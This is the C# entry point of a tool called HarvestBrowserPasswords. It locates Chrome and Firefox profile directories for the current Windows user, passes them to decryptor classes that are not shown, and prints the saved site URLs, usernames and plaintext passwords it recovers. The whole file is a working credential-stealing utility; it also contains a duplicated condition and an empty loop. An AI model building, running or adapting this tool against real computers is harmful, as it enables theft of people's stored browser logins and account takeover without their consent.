using System;
using System.Collections.Generic;
using System.Linq;
using System.Management;
using System.Security.Principal;
using System.Text;
using System.IO;
using CommandLine;

namespace HarvestBrowserPasswords
{
    class Program
    {
        static void Main(string[] args)
        {
            string userAccountName = GetCurrentUser();

            Options opts = new Options();

            var parser = new Parser(config => config.HelpWriter = null);

            //Parse command line arguments and store in opts
            var result = parser.ParseArguments<Options>(args)
                .WithParsed(parsed => opts = parsed)
                .WithNotParsed(errs => PrintUsageToConsole());

            List<BrowserLoginData> loginDataList = new List<BrowserLoginData>();

            if (opts.All)
            {
                loginDataList = (loginDataList.Concat(GetChromePasswords(userAccountName))).ToList();
                loginDataList = (loginDataList.Concat(GetFirefoxPasswords(userAccountName, opts.Password))).ToList();
            }
            else if (opts.Chrome)
            {
                loginDataList = (loginDataList.Concat(GetChromePasswords(userAccountName))).ToList();
            }
            else if (opts.Firefox)
            {
                loginDataList = (loginDataList.Concat(GetFirefoxPasswords(userAccountName, opts.Password))).ToList();
            }
            else if (opts.Help)
            {
                PrintUsageToConsole();
            }
            else
            {
                PrintUsageToConsole();
            }

            //If any logins were found, print them to console or write to CSV 
            if (loginDataList.Count > 0)
            {
                if (string.IsNullOrEmpty(opts.Outfile))
                {
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    PrintLoginsToConsole(loginDataList);
                    Console.ResetColor();
                }
                else
                {
                    //Write to CSV
                    //WriteToCsv(LoginDataList, opts.Outfile);
                }
            }         
        }

        //Check if currently running in administrator context
        public static bool IsAdministrator()
        {
            var identity = WindowsIdentity.GetCurrent();
            var principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }
      
        public static List<BrowserLoginData> GetChromePasswords(string userAccountName)
        {
            List<string> chromeProfiles = FindChromeProfiles(userAccountName);

            List<BrowserLoginData> loginDataList = new List<BrowserLoginData>();

            foreach (string chromeProfile in chromeProfiles)
            {
                string loginDataFile = chromeProfile + @"\Login Data";
                if (File.Exists(loginDataFile))
                {
                    ChromeDatabaseDecryptor decryptor = new ChromeDatabaseDecryptor(loginDataFile);

                    loginDataList = (loginDataList.Concat(decryptor.ChromeLoginDataList)).ToList();
                }
            }

            return loginDataList;
        }

        public static List<string> FindChromeProfiles(string userAccountName)
        {
            string chromeDirectory = $"C:\\Users\\{userAccountName}\\AppData\\Local\\Google\\Chrome\\User Data";
            List<string> profileDirectories = new List<string>();

            foreach (string directory in profileDirectories)
            {
                Console.WriteLine(directory);
            }

            if (Directory.Exists(chromeDirectory))
            if (Directory.Exists(chromeDirectory))
            {
                //Add default profile location once existence of chrome directory is confirmed
                profileDirectories.Add(chromeDirectory + "\\Default");
                foreach (string directory in Directory.GetDirectories(chromeDirectory))
                {
                    if (directory.Contains("Profile "))
                    {
                        profileDirectories.Add(directory);
                        Console.ForegroundColor = ConsoleColor.Green;
                        Console.WriteLine($"[+] Found Chrome Profile at {directory}");
                        Console.ResetColor();
                    }
                }
            }

            return profileDirectories;
        }

        //Overload for case where master password is set
        public static List<BrowserLoginData> GetFirefoxPasswords(string userAccountName, string masterPassword)
        {
            List<BrowserLoginData> loginDataList = new List<BrowserLoginData>();

            foreach (string profile in FindFirefoxProfiles(userAccountName))
            {
                FirefoxDatabaseDecryptor decryptor = new FirefoxDatabaseDecryptor(profile, masterPassword);

                //Take the list of logins from this decryptor and add them to the total list of logins
                loginDataList = (loginDataList.Concat(decryptor.FirefoxLoginDataList)).ToList();
            }

            return loginDataList;
        }

        public static List<string> FindFirefoxProfiles(string userAccountName)
        {
            //List to store profile directories
            List<string> profileDirectories = new List<string>();

            //Roaming directory contains most firefox artifacts apart from cache
            string roamingDir = $"C:\\Users\\{userAccountName}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles";

            //Check roaming profile
            if (Directory.Exists(roamingDir))
            {

                string[] roamingProfiles = Directory.GetDirectories(roamingDir);
                foreach (string directory in roamingProfiles)
                {
                    profileDirectories.Add(directory);
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine($"[+] Found Firefox Profile at {directory}");
                    Console.ResetColor();
                }
            }

            return profileDirectories;
        }

        public static string GetCurrentUser()
        {
            //Get username for currently running account (SamCompatible Enum format)
            string userAccountSamCompatible = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
            
            //Remove domain and backslashes from name
            int index = userAccountSamCompatible.IndexOf("\\", 0, userAccountSamCompatible.Length) + 1;
            string userAccountName = userAccountSamCompatible.Substring(index);

            return userAccountName;
        }

        private static void PrintLoginsToConsole(List<BrowserLoginData> loginDataList)
        {

            string line = new String('=', 60);

            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine(line);

            foreach (BrowserLoginData loginData in loginDataList)
            {
                Console.WriteLine($"URL              {loginData.FormSubmitUrl}");
                Console.WriteLine($"Username         {loginData.Username}");
                Console.WriteLine($"Password         {loginData.Password}");
                Console.WriteLine($"Browser          {loginData.Browser}");
                Console.WriteLine(line);
            }

            Console.ResetColor();
        }

        private static void PrintUsageToConsole()
        {
            Console.ForegroundColor = ConsoleColor.White;

            Console.WriteLine("HarvestBrowserPasswords.exe v1.0\n");
            Console.WriteLine("  -c, --chrome      Locate and decrypt Google Chrome logins\n");
            Console.WriteLine("  -f, --firefox     Locate and decrypt Mozilla Firefox logins\n");
            Console.WriteLine("  -a, --all         Locate and decrypt Google Chrome and Mozilla Firefox logins\n");
            Console.WriteLine("  -p, --password    (Optional) Master password for Mozilla Firefox Logins\n");
            Console.WriteLine("  -o, --outfile     Write output to csv\n");
            Console.WriteLine("  --help            Display help");

            Console.ResetColor();
        }
    }  
}
